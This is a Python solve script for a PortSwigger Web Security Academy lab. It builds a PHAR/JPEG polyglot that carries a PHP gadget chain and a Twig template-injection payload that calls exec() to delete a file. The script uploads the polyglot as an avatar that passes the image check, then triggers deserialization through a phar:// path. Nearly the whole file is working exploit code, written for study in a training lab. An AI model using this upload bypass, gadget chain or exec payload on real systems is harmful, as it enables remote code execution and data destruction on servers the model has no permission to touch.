#!/usr/bin/env python3
"""
Using PHAR deserialization to deploy a custom gadget chain
PortSwigger Web Security Academy -- Insecure Deserialization

Companion script for the writeup: 10-using-phar-deserialization-to-deploy-a-custom-gadget-chain.md

What this does:
    Builds a TAR-based PHAR/JPEG polyglot (the "kunte0" technique): a PHAR
    archive in TAR format, embedded inside a JPEG's COM (comment) marker
    segment, so the same bytes are simultaneously a structurally valid JPEG
    (passes the avatar upload's file-type check) and a valid PHAR archive
    (parsed by PHP's phar:// stream wrapper). The PHAR metadata carries a
    serialized CustomTemplate(Blog(...)) object graph: CustomTemplate's
    __destruct() string-concatenates template_file_path, which -- because
    that property is itself an object -- forces Blog.__toString(), which
    renders `desc` through Twig 1.x. desc is a Server-Side Template
    Injection payload that abuses Twig's filter registration to reach
    exec(). No cookie or explicit unserialize() call is involved: the
    trigger is a plain file_exists() on a phar:// path, which PHP silently
    deserializes as a side effect of the existence check.

    Upload the polyglot as the avatar, then request
    avatar.php?avatar=phar://<username> to fire it.

Usage:
    python 10-using-phar-deserialization-to-deploy-a-custom-gadget-chain.py <lab-url>
    e.g. python 10-using-phar-deserialization-to-deploy-a-custom-gadget-chain.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
    pip install Pillow   # optional -- only used to generate the base JPEG; a
                          # hardcoded minimal 1x1 JPEG is used if Pillow isn't installed
"""

import hashlib
import re
import struct
import sys
import time
from io import BytesIO

import httpx


def _build_tar_header(name: str, size: int, mtime: int, mode: str = "0000644") -> bytes:
    """Build a 512-byte POSIX (ustar) TAR header matching PHP's tar format."""
    hdr = bytearray(512)
    nb = name.encode("ascii")
    hdr[0:len(nb)] = nb
    hdr[100:108] = (mode + "\x00").encode("ascii")
    hdr[108:116] = b"0000000\x00"
    hdr[116:124] = b"0000000\x00"
    hdr[124:136] = f"{size:011o}\x00".encode("ascii")
    hdr[136:148] = f"{mtime:011o}\x00".encode("ascii")
    hdr[148:156] = b"        "  # checksum placeholder
    hdr[156] = ord("0")         # regular file
    hdr[257:263] = b"ustar\x00"
    hdr[263:265] = b"00"
    chksum = sum(hdr)
    hdr[148:155] = f"{chksum:06o}\x00".encode("ascii")
    hdr[155] = 0
    return bytes(hdr)


def _pad_512(data: bytes) -> bytes:
    r = len(data) % 512
    return data + b"\x00" * (512 - r) if r else data


def _make_tar_entry(name: str, content: bytes, mtime: int, mode: str = "0000644") -> bytes:
    return _build_tar_header(name, len(content), mtime, mode) + _pad_512(content)


def build_phar_jpg_polyglot(metadata: bytes) -> bytes:
    """Build a PHAR-JPG polyglot using the TAR-based (kunte0) technique."""
    try:
        from PIL import Image
        img = Image.new("RGB", (1, 1), (255, 255, 255))
        buf = BytesIO()
        img.save(buf, "JPEG")
        jpeg_data = buf.getvalue()
    except ImportError:
        jpeg_data = bytes.fromhex(
            "ffd8ffe000104a46494600010100000100010000"
            "ffdb004300080606070605080707070909080a0c"
            "140d0c0b0b0c1912130f141d1a1f1e1d1a1c1c"
            "20242e2720222c231c1c2837292c30313434341f"
            "27393d38323c2e333432ffc0000b080001000101"
            "011100ffc4001f00000105010101010100000000"
            "00000000000102030405060708090a0bffc40000"
            "ffda00080101000003100002000000017f"
            "ffd9"
        )

    mtime = int(time.time())
    stub_content = b"<?php __HALT_COMPILER(); ?>\r\n"

    # TAR entry order matters -- it matches PHP's own Phar class output:
    # user file first, then .phar/stub.php, .phar/.metadata.bin, .phar/signature.bin
    entry_test = _make_tar_entry("test.txt", b"test", mtime, mode="0000644")
    entry_stub = _make_tar_entry(".phar/stub.php", stub_content, mtime, mode="0000666")
    entry_meta = _make_tar_entry(".phar/.metadata.bin", metadata, mtime, mode="0000000")

    pre_sig = entry_test + entry_stub + entry_meta
    sha1_hash = hashlib.sha1(pre_sig).digest()
    sig_content = struct.pack("<I", 0x0002) + struct.pack("<I", 20) + sha1_hash
    entry_sig = _make_tar_entry(".phar/signature.bin", sig_content, mtime, mode="0000666")

    tar = entry_test + entry_stub + entry_meta + entry_sig + b"\x00" * 1024

    # kunte0 polyglot transform: strip the first 6 bytes of the TAR stream
    # ("test.t" from the first entry's filename), prepend JPEG SOI + COM
    # marker + COM length in their place, append the rest of a real JPEG.
    phar_stripped = tar[6:]
    com_len = len(phar_stripped) + 2  # COM length includes its own 2 length bytes

    polyglot = (
        b"\xff\xd8"                                 # JPEG SOI
        + b"\xff\xfe"                               # JPEG COM marker
        + struct.pack(">H", min(com_len, 65535))    # COM length (big-endian)
        + phar_stripped
        + jpeg_data[2:]
    )

    # Recalculate the first TAR entry header's checksum -- the byte splicing
    # above invalidates the one computed inside _build_tar_header.
    poly = bytearray(polyglot)
    poly[148:156] = b"        "
    chksum = sum(poly[0:512])
    poly[148:155] = f"{chksum:06o}\x00".encode("ascii")
    poly[155] = 0
    return bytes(poly)


def solve(lab_url: str, username: str = "wiener", password: str = "peter") -> None:
    ssti = (
        b'{{_self.env.registerUndefinedFilterCallback("exec")}}'
        b'{{_self.env.getFilter("rm /home/carlos/morale.txt")}}'
    )

    # PUBLIC property encoding (no null-byte class prefix) -- the kunte0
    # tooling defines CustomTemplate as an empty class, so its properties
    # are dynamic/public even though __destruct() still reaches them via
    # $this->template_file_path the same way it would a declared property.
    blog_ser = (
        b'O:4:"Blog":2:{'
        b's:4:"desc";s:' + str(len(ssti)).encode() + b':"' + ssti + b'";'
        b's:4:"user";s:4:"user";'
        b"}"
    )
    metadata = (
        b'O:14:"CustomTemplate":1:{'
        b's:18:"template_file_path";'
        + blog_ser +
        b"}"
    )
    print(f"[*] Gadget chain metadata: {len(metadata)} bytes")

    polyglot = build_phar_jpg_polyglot(metadata)
    print(f"[*] Built PHAR-JPG polyglot: {len(polyglot)} bytes")

    client = httpx.Client(follow_redirects=True, timeout=15)

    login_page = client.get(f"{lab_url}/login")
    csrf_match = re.search(r'name="csrf"\s+value="([^"]+)"', login_page.text)
    csrf = csrf_match.group(1) if csrf_match else ""
    client.post(f"{lab_url}/login", data={"csrf": csrf, "username": username, "password": password})
    print(f"[+] Logged in as {username}")

    r = client.get(f"{lab_url}/my-account")
    csrf_match = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    csrf = csrf_match.group(1) if csrf_match else ""

    print("[*] Uploading the PHAR-JPG polyglot as the avatar...")
    r = client.post(
        f"{lab_url}/my-account/avatar",
        files={"avatar": ("exploit.jpg", polyglot, "image/jpeg")},
        data={"csrf": csrf, "user": username},
    )
    if "successfully" in r.text.lower():
        print("[+] Upload successful")
    else:
        print(f"[!] Upload response: {r.status_code}")

    r = client.get(f"{lab_url}/cgi-bin/avatar.php?avatar={username}")
    print(f"[*] Avatar verify: {r.status_code}, {len(r.content)} bytes")

    print("[*] Triggering phar:// deserialization via file_exists()...")
    for path in [f"phar://{username}", f"phar://{username}/test.txt"]:
        r = client.get(f"{lab_url}/cgi-bin/avatar.php?avatar={path}")
        print(f"    {path}: {r.status_code}")

        check = client.get(lab_url)
        if "Congratulations" in check.text:
            print(f"[+] Lab solved via {path} -- morale.txt deleted through the Twig SSTI chain.")
            return

    print("[-] Not solved yet -- check the gadget chain or the trigger path.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
